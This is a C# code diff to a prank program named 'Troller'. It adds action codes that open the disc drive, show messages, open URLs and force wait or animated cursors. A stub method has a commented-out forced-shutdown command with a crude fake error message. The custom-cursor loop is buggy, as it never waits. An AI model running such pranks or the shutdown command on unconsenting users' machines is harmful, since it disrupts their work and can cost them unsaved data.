@@ -1,5 +1,7 @@
 ﻿using System;
 using System.Diagnostics;
+using System.Drawing;
+using System.Drawing.Imaging;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Threading;
@@ -111,11 +113,14 @@ namespace Troller
         /// <returns>True on success, False otherwise.</returns>
         private static bool DoTrolling(string actionCode, string parameter)
         {
+            // Use action codes with 7 characters
             switch (actionCode)
             {
-                case "DSK": return OpenDisksDrive(parameter);
-                case "MSG": return ShowMessage(parameter);
-                case "URL": return OpenLinkOnBrowser(parameter);
+                case "DISKDRV": return OpenDisksDrive(parameter);
+                case "MESSAGE": return ShowMessage(parameter);
+                case "OPENURL": return OpenLinkOnBrowser(parameter);
+                case "WAITCUR": return ChangeCursorToWait(parameter);
+                case "CUSTCUR": return ChangeCursorToAnimation(parameter);
                 default: return true;
             }
         }
@@ -196,7 +201,71 @@ namespace Troller
             }
             else return false;
         }
-        
+
+        /// <summary>
+        /// Change mouse cursor to wait state.
+        /// </summary>
+        /// <param name="numSeconds">Number of seconds to display the wait cursor.</param>
+        /// <returns>True on success. False otherwise.</returns>
+        private static bool ChangeCursorToWait(string numSeconds)
+        {
+            DebugConsole.WriteLine("Change cursor to wait state.");
+            int totalSeconds = int.Parse(numSeconds);
+
+            for (int currentSec = 0; currentSec < totalSeconds; currentSec++)
+            {
+                Cursor.Current = Cursors.WaitCursor;
+                Application.UseWaitCursor = true;
+                Thread.Sleep(1000 * 1);
+            }
+            return true;
+        }
+
+        /// <summary>
+        /// Change mouse cursor to custom animated gif (FROM: http://stackoverflow.com/a/2902336/675577).
+        /// </summary>
+        /// <param name="numSeconds">Number of seconds to display the custom animation.</param>
+        /// <returns>True on success. False otherwise.</returns>
+        private static bool ChangeCursorToAnimation(string numSeconds)
+        {
+            DebugConsole.WriteLine("Change cursor to custom animation.");
+            int totalSeconds = int.Parse(numSeconds);
+
+            try
+            {
+                // Choose custom cursor
+                byte[] cursorResource = Properties.Resources.dog;   // TODO: use random to choose from available resources
+
+                // From Resource to temp file
+                string tempFileName = "temp_cursor.ani";
+                if (File.Exists(tempFileName)) File.Delete(tempFileName);
+                File.WriteAllBytes(tempFileName, cursorResource);
+
+                // Create cursor
+                tempFileName = Path.Combine(Application.StartupPath, tempFileName);
+                Cursor customCursor = AdvancedCursor.Create(tempFileName);
+
+                // Force the cursor during totalSeconds
+                for (int currentSec = 0; currentSec < totalSeconds; currentSec += 5)
+                {
+                    Cursor.Current = customCursor;
+                }
+                return true;
+            }
+            catch (Exception)
+            {
+                return false;
+            }
+        }
+
+        private static bool ScheduleShutdown(string shutdownMessage)
+        {
+            int timeToShutdown = 0; //minutes
+            //run command line
+            //shutdown -s -t 1925000 -c “System error: overloaded porn folder”
+            return true;
+        }
+
         #endregion
 
         #region Aux methods
@@ -255,6 +324,49 @@ namespace Troller
         #endregion
     }
 
+    #region Auxiliary classes
+
+    /// <summary>
+    /// Class that reads resources files and creates Cursors.
+    /// </summary>
+    internal static class AdvancedCursor
+    {
+        [DllImport("User32.dll")]
+        private static extern IntPtr LoadCursorFromFile(String str);
+        [DllImport("User32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        internal static extern IntPtr LoadImage(IntPtr hinst, string lpszName, uint uType, int cxDesired, int cyDesired, uint fuLoad);
+
+        /// <summary>
+        /// Creates a cursor from a file.
+        /// </summary>
+        public static Cursor Create(string filename)
+        {
+            return CreateUsingLoadCursor(filename);
+        }
+
+        private static Cursor CreateUsingLoadCursor(string filename)
+        {
+            IntPtr hCursor = LoadCursorFromFile(filename);
+
+            if (!IntPtr.Zero.Equals(hCursor))
+            {
+                return new Cursor(hCursor);
+            }
+            else
+            {
+                throw new ApplicationException("Could not create cursor from file " + filename);
+            }
+        }
+
+        private static Cursor CreateUsingLoadImage(string filename)
+        {
+            const int IMAGE_CURSOR = 2;
+            const uint LR_LOADFROMFILE = 0x00000010;
+            IntPtr ipImage = LoadImage(IntPtr.Zero, filename, IMAGE_CURSOR, 0, 0, LR_LOADFROMFILE);
+            return new Cursor(ipImage);
+        }       
+    }
+
     /// <summary>
     /// Class that writes debug messages into a Console.
     /// </summary>
@@ -278,4 +390,6 @@ namespace Troller
             Console.Write(text);
         }
     }
+
+    #endregion
 }
